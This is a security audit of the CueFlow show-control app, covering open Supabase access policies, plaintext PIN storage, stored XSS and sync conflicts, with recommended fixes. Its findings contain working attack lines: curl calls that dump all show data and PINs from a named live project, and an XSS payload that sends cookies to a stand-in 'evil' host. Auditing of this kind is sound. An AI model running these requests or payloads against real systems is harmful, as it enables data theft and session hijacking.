# CueFlow — Security, Data Integrity & Reliability Audit

**Date:** 2026-07-04
**Scope:** `index.html` (3 script blocks), `lan-server.js`, `main.js`, `preload.js`, live Supabase project `bdqqkmkxflamzqjonvko` (RLS policies, RPCs, schema).
**Method:** Read the persistence/sync/role code paths end-to-end, inspected the live database policies and SECURITY DEFINER functions, ran the Supabase security advisor, and traced the data flow user-action → state → persist → Realtime → other clients.

## Executive summary

The client-side engineering is genuinely careful — history snapshots, echo detection, an owner conflict modal, per-device visibility, path-traversal guards, and Electron context isolation are all done well (see *What's done well*). **But the server-side authorization model is effectively absent, and that is disqualifying for the stated benchmark.**

Two Row-Level-Security policies are `USING (true)`, and access PINs are stored in a **plaintext** column (`show_access.display_pin`). Because the Supabase publishable key ships in the public HTML, **anyone on the internet can read every show's full project data and every show's PINs (including owner PINs) for all shows in the database, then join or overwrite any show.** This is not theoretical — it is a handful of REST calls with a key that is already public. Everything else in this report is secondary to that.

There is also a **stored XSS** hole via the rich-text sequence description, which is rendered as raw `innerHTML` in the live cockpit and synced to every client.

**Verdict:** Not currently safe to run a high-value show on the cloud backend without a stranger being able to read it, deface it, or break the operator's live view. The good news: the top risks are a small, well-scoped set of fixes (RLS policies, drop the plaintext PIN column, sanitize one field). None require re-architecting the app.

---

## CRITICAL findings

### C1 — `shows` is world-readable: any internet user can read every show's full data
- **Category:** Security (data exposure / confidentiality)
- **Severity:** Critical
- **Location:** Supabase policy `shows_select` on `public.shows` — `qual = true`. Client key in `index.html:4` region / CLAUDE.md documents the publishable key.
- **Description:** The `SELECT` policy on `shows` is `USING (true)`. The publishable/anon key is embedded in the shipped client (by design for Supabase — the anon key is *meant* to be public; RLS is supposed to be the gate). With `true`, RLS is not a gate at all for reads.
- **Attack scenario:** `curl 'https://bdqqkmkxflamzqjonvko.supabase.co/rest/v1/shows?select=id,name,project_data' -H "apikey: sb_publishable_...”` returns **every show in the database**, including full cue sheets, sequence names, notes, and structure. No login, no PIN. An attacker can enumerate all `id`s and dump all `project_data`.
- **Impact:** Total loss of confidentiality for every customer's show. For a 20,000-seat production, the entire running order, cue timings, and production notes leak to anyone who views source on the public site once to grab the key.
- **Recommendation:** Replace `shows_select` with an ownership/PIN-scoped policy. Owners read their own rows via `auth.uid() = owner_id`. Collaborators should **not** read `shows` directly at all — route their reads through a SECURITY DEFINER RPC that takes `(show_id, pin_hash)`, validates the PIN server-side, and returns only that show's data (mirroring the existing `push_show_data` pattern). Then set the base policy to `USING (auth.uid()::text = owner_id)`.
- **Effort:** Medium (need a `get_show_data(show_id, pin_hash)` RPC + change the viewer/editor join path in `cfJoin` at `index.html:18647` to call it instead of `db().from('shows').select(...)`).

### C2 — `show_access` is world-readable AND PINs are stored in plaintext
- **Category:** Security (credential exposure → write access)
- **Severity:** Critical
- **Location:** Supabase policy `access_select` on `public.show_access` — `qual = true`. Plaintext column `show_access.display_pin` (confirmed: sampled rows show `display_pin` = `"697964"`, `"414757"`, etc. in the clear). Written at `index.html:19882`, `19913`, `20223`, `16678`.
- **Description:** The `show_access` `SELECT` policy is `USING (true)`, and the table stores the PIN twice: `pin_hash` (SHA-256 truncated to 16 hex chars) **and** `display_pin` (the raw 6-digit PIN in plaintext, so the owner UI can show it). Anyone with the anon key can read the whole table.
- **Attack scenario:** `curl '.../rest/v1/show_access?select=show_id,role,display_pin,pin_hash,track_ids' -H "apikey: sb_publishable_..."` returns **every PIN for every show, for every role, including `owner`**. The attacker now: (a) joins any show in any role via the normal PIN flow, and (b) has each editor `pin_hash`, which is the exact credential `push_show_data` accepts — so they can **overwrite any show's entire `project_data`** by calling the RPC directly. The `pin_hash` truncation to 64 bits is irrelevant because the plaintext is right there anyway.
- **Impact:** Full write compromise of every show. An attacker can wipe or scramble a live cue sheet mid-show, or silently alter cue timings. This is the single worst finding: it converts C1's read breach into a write breach.
- **Recommendation:** (1) **Stop storing `display_pin`.** Show the PIN once at creation time in the UI and never persist the cleartext; if owners must retrieve it later, that is a product decision but the cleartext must not live in a world-readable row. (2) Replace `access_select` with `USING (EXISTS (SELECT 1 FROM shows WHERE shows.id = show_access.show_id AND shows.owner_id = auth.uid()::text))` so only the owner can list a show's access rows. (3) The PIN-validation join path must go through a SECURITY DEFINER RPC (see C1) that takes the PIN, hashes server-side, and returns only the role/tracks — the client should never `SELECT` from `show_access` for validation. (4) Use a full-length salted hash for `pin_hash`.
- **Effort:** Medium.

### C3 — Stored XSS via rich-text sequence description, rendered raw in the live cockpit
- **Category:** Security (stored XSS) / Reliability
- **Severity:** Critical
- **Location:** Saved (raw `innerHTML` from a `contenteditable`) at `index.html:8775`, `10479`, `11695`. Rendered as raw `innerHTML` at `index.html:6152`, `6167`, `8227`, `10473`, `11701`. `song.description` travels through `snapshot()` → Supabase → every client.
- **Description:** The sequence "notes/description" is a rich-text field: the app stores `rteEditor.innerHTML` verbatim and re-injects it with `el.innerHTML = song.description`. There is no sanitization on save or render. (Cue `name`/`desc` *are* escaped with `escH` — good — so this is specific to `song.description`.)
- **Attack scenario:** An editor (or, given C1/C2, *any internet user*) sets a sequence description to `<img src=x onerror="fetch('https://evil/'+document.cookie)">` or a payload that calls `db().auth` / reads localStorage. It syncs to the owner. The owner's live cockpit renders it via `innerHTML` at `index.html:6152/6167` → the payload executes **on the operator's machine during the show**. `<script>` won't run via `innerHTML`, but `<img onerror>`, `<svg onload>`, and inline event handlers will.
- **Impact:** Arbitrary JS in the operator's session: steal the Supabase JWT / offline auth from localStorage, silently corrupt the project, or throw an exception that blanks the NEXT-hero/description panel mid-show. Cross-tenant once C1/C2 are open.
- **Recommendation:** Sanitize on render with an allowlist (a tiny inline sanitizer permitting `b/i/u/br/p/span/ul/ol/li` and stripping all attributes/event handlers, or bundle DOMPurify and `DOMPurify.sanitize(song.description)` at every injection point). Sanitize on save too as defense-in-depth. Do not rely on "only editors can write" — that gate is currently broken and even when fixed, editors are semi-trusted.
- **Effort:** Low–Medium.

---

## HIGH findings

### H1 — `track-editor` restriction is client-side only; the server lets them overwrite the whole show
- **Category:** Security (privilege escalation) / Data Integrity
- **Severity:** High
- **Location:** RPC `push_show_data` (Supabase) accepts any `role IN ('editor','track-editor')` and does `UPDATE shows SET project_data = <entire blob>`. Client-side track scoping in `_applyAccessRow` (`index.html:18600`+).
- **Description:** A `track-editor` is supposed to be limited to their assigned tracks. But `push_show_data` writes the **entire** `project_data` the client sends; it does not diff against the caller's allowed tracks. The restriction exists only in the client UI.
- **Attack scenario:** A track-editor opens devtools (or crafts an RPC call) and pushes a `project_data` that alters or deletes tracks/sequences they were never granted. The server accepts it.
- **Impact:** A partially-trusted crew member can overwrite the entire show, including other departments' cues.
- **Recommendation:** For track-scoped roles, do field-level authorization server-side (an RPC that accepts only the changed cues/tracks and merges them into the stored blob after checking each against the caller's `track_ids`), or accept that `track-editor` is "trusted editor with a filtered UI" and document it as not a security boundary. The former is the only real fix.
- **Effort:** High.

### H2 — 6-digit PINs from `Math.random()`, no server-side rate limiting
- **Category:** Security
- **Severity:** High (Medium once C1/C2 are fixed, because brute force becomes the *only* path)
- **Location:** `index.html:16675`, `16954`, `19879`, `19911`, `20219`, `20256` — `String(Math.floor(100000+Math.random()*900000))`. `hashPin` at `index.html:16985` truncates SHA-256 to 16 hex chars.
- **Description:** PIN space is 10^6 (~20 bits), generated with non-cryptographic `Math.random()`. There is no server-side throttling on PIN validation. Today this is moot because C2 hands the PIN over directly; after C2 is fixed, an attacker who knows a `show_id` can brute-force the validation RPC. `Math.random()` is also predictable enough that PINs created in a known time window have reduced effective entropy.
- **Attack scenario:** Post-C2-fix: script 1,000,000 calls to the validation RPC for a target `show_id`. At even 50 req/s that's ~5.5 hours to guarantee a hit, minutes to hours for a lucky hit — well within a show's load-in window.
- **Impact:** Unauthorized join/overwrite of a targeted show.
- **Recommendation:** Generate PINs with `crypto.getRandomValues`. Add server-side rate limiting / lockout on the validation RPC (e.g. count attempts per `show_id` in a table, back off after N failures). Consider 8-digit PINs for high-value shows. Store a properly salted, full-length hash.
- **Effort:** Medium.

### H3 — Editor writes are blind last-write-wins with no conflict detection
- **Category:** Data Integrity / Consistency
- **Severity:** High
- **Location:** Editor push path `index.html:17064` (`push_show_data` with full snapshot). Conflict detection (`findConflicts`, `showConflictModal`, `_versionsDiffer`) only runs in the postgres_changes handler under `if(CF.isOwner && CF.dirty)` at `index.html:17417`.
- **Description:** All conflict handling is gated on `CF.isOwner`. For an editor, an incoming remote update calls `applyRemote(proj)` directly (`index.html:17435`), silently discarding the editor's unsaved local edits; and when the editor pushes, `push_show_data` blindly overwrites whatever is in the row. Two editors — or an editor and the owner — editing concurrently lose each other's work with no prompt.
- **Failure scenario:** Two operators prep different sequences during load-in. Editor A saves; Editor B's client receives the echo and `applyRemote` wipes B's in-progress edits. Or both save within the debounce window and the later push clobbers the earlier — no modal, no history entry for the editor path (`_saveShowSnapshot` only runs on the owner branch, `index.html:17123`).
- **Impact:** Silent loss of cue work in exactly the multi-operator scenario the tool is built for.
- **Recommendation:** Run the same `findConflicts`/`_versionsDiffer` path for editors, not just owners. At minimum, do an optimistic-concurrency check server-side in `push_show_data`: pass the `updated_at` the client last saw and reject the write if the row moved, forcing a client-side merge. Also call the history snapshot for editor writes.
- **Effort:** Medium.

### H4 — SECURITY DEFINER RPCs are callable by `anon`
- **Category:** Security
- **Severity:** High (defense-in-depth; the concrete exploit is C2's leaked PIN)
- **Location:** Supabase advisor: `push_show_data`, `save_show_snapshot`, `update_cue_desc` all `SECURITY DEFINER` and `EXECUTE`-able by `anon`/`authenticated`. https://supabase.com/docs/guides/database/database-linter?lint=0028_anon_security_definer_function_executable
- **Description:** These functions run with definer privileges and are exposed on the public REST surface. `push_show_data` is the write-bypass used by editors; its only gate is the `pin_hash`, which C2 leaks. `save_show_snapshot` correctly checks `auth.uid() = owner_id` (good). `update_cue_desc` accepts `viewer`/`crew` (see M1).
- **Recommendation:** Keep them DEFINER (they need it to bypass RLS intentionally) but make the internal auth airtight: validate PIN server-side, add rate limiting (H2), and once the read path is RPC-based, ensure no DEFINER function returns more than the caller's scope. Revoke EXECUTE from roles that never legitimately call a given function.
- **Effort:** Low–Medium.

---

## MEDIUM findings

### M1 — "Read-only" viewers/crew can write cue descriptions
- **Category:** Consistency / Security
- **Severity:** Medium
- **Location:** RPC `update_cue_desc` allows `role IN ('viewer','crew','editor','track-editor')`. LAN equivalent `_cfLanOnClientMsg` at `index.html:17897` applies `cue_desc` with **no role check at all**.
- **Description:** The role table documents `viewer` and `crew` as read-only, but both can persist cue-description edits (cloud RPC and LAN path). The LAN handler applies any joined client's `cue_desc` regardless of role.
- **Impact:** A viewer can alter the operator's cue notes. Low blast radius (one field), but it contradicts the stated role model and is an unlogged write.
- **Recommendation:** Decide whether crew notes are a feature. If yes, document it and add it to the LAN handler's role check explicitly. If no, restrict `update_cue_desc` to editor roles and add a role check in `_cfLanOnClientMsg`.
- **Effort:** Low.

### M2 — No durable offline edit queue; offline reconnect is whole-snapshot last-write-wins
- **Category:** Reliability / Data Integrity
- **Severity:** Medium
- **Location:** `online`/`offline` handlers `index.html:20699`–20717; `pushProject` early-returns when `!navigator.onLine` setting a single `CF.dirty` bit (`index.html:17060`).
- **Description:** Offline state is a single boolean plus the in-memory `state` and a localStorage cache — there is no per-operation queue. On reconnect the owner does `_fetchAndCheckConflicts` then pushes the whole snapshot. Two devices edited offline → whichever reconnects last overwrites the other (the owner gets a conflict modal; editors get nothing, per H3).
- **Failure scenario:** Venue Wi-Fi drops. Owner edits on the booth laptop; an editor edits on a tablet. Wi-Fi returns; the tablet (editor) pushes last and silently overwrites the booth's changes.
- **Recommendation:** Persist a change log or at least the full dirty snapshot to localStorage keyed by `show_id` (a `DIRTY_KEY` exists — ensure the *payload*, not just the flag, survives a refresh), and run conflict resolution for all roles on reconnect (ties into H3). Surface "N unsynced changes" explicitly.
- **Effort:** Medium–High.

### M3 — Leaked-password protection disabled on Supabase Auth
- **Category:** Security
- **Severity:** Medium
- **Location:** Supabase advisor `auth_leaked_password_protection`. https://supabase.com/docs/guides/auth/password-security
- **Description:** Owner accounts use email/password; HaveIBeenPwned checking is off, so owners can set known-breached passwords. Owner compromise = full control of a show via the legitimate write path.
- **Recommendation:** Enable leaked-password protection and a minimum strength policy in the Supabase Auth settings.
- **Effort:** Low.

### M4 — Offline/logged-out show creation can strand data
- **Category:** Data Integrity
- **Severity:** Medium
- **Location:** `createShow` `index.html:19875`, `pushProject` owner branch `index.html:17084` — both write `owner_id: authUser ? authUser.id : null`.
- **Description:** The `shows` INSERT policy requires `auth.uid()::text = owner_id`. A show created while not authenticated gets `owner_id = null`, which the policy rejects, so it can never sync — it lives only in the local cache. There's no user-facing signal that the project is un-synced-and-unsyncable.
- **Recommendation:** Block show creation (or clearly mark "local only, sign in to save") when `!authUser`; on sign-in, re-stamp orphaned local shows with the new `owner_id` and push.
- **Effort:** Low–Medium.

### M5 — LAN inbound handler does no role enforcement
- **Category:** Security (LAN threat model)
- **Severity:** Medium
- **Location:** `lan-server.js:139-159` (join validates PIN → *some* role, but message dispatch only checks `ws._joined`), `_cfLanOnClientMsg` `index.html:17897`.
- **Description:** The WS server accepts any message from any joined client and forwards it to the owner; the renderer applies `cue_desc` without checking the sender's role. Today the vocabulary is limited to `cue_desc`, so impact ≈ M1. But the pattern (validate identity, ignore authorization) is fragile — any new inbound message type inherits the hole.
- **Recommendation:** Stamp `ws._role` (already captured at `lan-server.js:147`) onto forwarded messages and enforce role in `_cfLanOnClientMsg`.
- **Effort:** Low.

---

## LOW findings

### L1 — `escH` does not escape `'` or `>`
- **Category:** Security (latent)
- **Severity:** Low
- **Location:** `index.html:5045` — `escH` replaces `&`, `<`, `"` only.
- **Description:** Current call sites put escaped values into double-quoted attributes or text nodes, where the missing `'`/`>` are harmless. But it's a footgun: any future use inside a single-quoted attribute or an inline handler string would be injectable.
- **Recommendation:** Add `.replace(/'/g,'&#39;').replace(/>/g,'&gt;')`.
- **Effort:** Low.

### L2 — LAN server: plaintext HTTP, CORS `*`, PIN in URL, no join rate limit
- **Category:** Security (LAN threat model)
- **Severity:** Low
- **Location:** `lan-server.js:69` (`Access-Control-Allow-Origin: *`), `:130-160` (no throttle), join over `ws://` on `http://<ip>`.
- **Description:** On a hostile shared venue network, the PIN is sniffable (plaintext WS, PIN also in the join URL) and brute-forceable (no rate limit). Acceptable for a trusted backstage LAN; risky on shared house Wi-Fi.
- **Recommendation:** Document the LAN feature as trusted-network-only; consider a per-session token after join and a simple attempt counter. Low priority relative to the cloud holes.
- **Effort:** Low–Medium.

### L3 — Verbose `console.warn` of backend errors in production
- **Category:** Data Exposure
- **Severity:** Low
- **Location:** e.g. `index.html:17067`, `17089`, `17303`.
- **Description:** RPC/DB error messages are logged to the console. Minor internal-detail leak; also noise during a show.
- **Recommendation:** Gate behind a debug flag.
- **Effort:** Low.

---

## What's done well (positive findings)

These are real strengths and should be preserved:

- **Server-side history snapshots.** `save_show_snapshot` keeps the last 10 versions per show and correctly checks `auth.uid() = owner_id` (`index.html:17180`, RPC def). This is a genuine data-loss safety net and the single best integrity feature in the app.
- **Owner conflict resolution.** Field-level `findConflicts` + `_versionsDiffer` + a resolution modal, plus `_showVersionConflict` for structural diffs, means the owner is never silently overwritten (`index.html:17417-17435`). Extend this to editors (H3) and it's excellent.
- **Realtime echo detection.** `_recordOwnPush` / `_isOwnPushEcho` tracks a *set* of recent push timestamps and compares as epoch-ms, correctly avoiding spurious conflict modals on rapid edits (`index.html:17040-17051`). Thoughtful.
- **Per-device visibility deliberately excluded from `snapshot()`** with a clear rationale (`index.html:17018`). Prevents one user's show/hide from stomping everyone's.
- **Electron hardening.** `contextIsolation: true`, `nodeIntegration: false`, a locked permission allowlist, and a path-traversal guard on `media:read-file` (`main.js:17-34, 118`). No `webSecurity:false`, no remote content.
- **Client-generated UUIDs + `BOOT_PLACEHOLDER_ID` guard** in `pushProject` (`index.html:17059`) prevent the phantom/duplicate-show writes noted in the project's history. Upsert-by-UUID means a failed offline insert re-syncs to the same row rather than duplicating.
- **Cue `name`/`desc` are consistently escaped** with `escH` in the waterfall and cue list (`index.html:7501`, `8109`) — the XSS hole is confined to the one rich-text field (C3).

---

## Assessment: are the `true` RLS policies acceptable for this threat model?

**No — they are the critical hole, not an acceptable trade-off.** A defensible use of `USING (true)` would be a table with no confidential data, or where every row is intended to be public. Here, `shows.project_data` is the customer's confidential running order and `show_access` holds **plaintext access credentials for every tenant**. Combined with a publicly-shipped anon key, `true` means "no access control." The write policies on `shows` (INSERT/UPDATE/DELETE gated on `auth.uid() = owner_id`) are correct and show the author knows how to write real policies — the SELECT policies just need to match that standard, and the collaborator read path needs to move to a validated RPC.

**Vulnerable in theory vs exploitable in practice:** C1 and C2 are *exploitable in practice today* with a key that is already public and a single `curl`. C3 is exploitable in practice by any editor now, and by anyone once C1/C2 are open. H1–H4 are exploitable but require a bit more effort or a partially-trusted actor. The rest are hardening.

---

## Prioritized action plan

1. **Lock down RLS on `shows` (C1)** and move collaborator reads to a validated `get_show_data(show_id, pin_hash)` RPC.
2. **Lock down RLS on `show_access` and drop the plaintext `display_pin` column (C2).** Route PIN validation through a DEFINER RPC; never `SELECT` the table from the client for auth.
3. **Sanitize `song.description` on render (C3).**
4. **Enforce track-editor scope server-side, or downgrade it from a security claim (H1).**
5. **CSPRNG PINs + server-side rate limiting on validation (H2).**
6. **Run conflict detection for editors, not just owners; snapshot editor writes (H3).**
7. **Tighten SECURITY DEFINER RPC exposure and internal auth (H4).**
8. **Resolve the viewer/crew write-path inconsistency (M1) and add role checks to the LAN handler (M5).**
9. **Durable offline queue + all-role reconnect conflict resolution (M2).**
10. **Enable leaked-password protection (M3); handle logged-out show creation (M4).**

See `PRIORITY_ACTIONS.md` for the condensed top-10 checklist.
